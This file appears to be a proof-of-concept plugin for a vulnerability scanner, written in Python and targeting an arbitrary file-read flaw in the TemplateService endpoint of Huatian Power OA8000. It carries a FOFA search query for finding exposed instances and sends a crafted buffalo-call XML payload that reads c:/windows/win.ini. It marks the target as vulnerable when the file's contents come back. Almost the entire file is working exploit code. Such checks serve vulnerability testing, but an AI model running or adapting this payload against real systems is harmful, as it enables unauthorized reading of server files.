#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/t_0rBRrYmJprm9OEh1VuJg',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   '华天动力OA TemplateService 接口任意文件读取',

      'level'     :   'medium',

      'FOFA'      :   'app="华天动力-OA8000"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

      'create_time':  '2024/4/8',
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Content-Type': 'text/xml',
      }
  target = '/OAapp/bfapp/buffalo/TemplateService'
  body = '''
<buffalo-call>
<method>getHtmlContent</method>
<string>c:/windows/win.ini</string>
</buffalo-call>
  '''
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=body,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'for 16-bit app support',res.text,re.S):
      ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret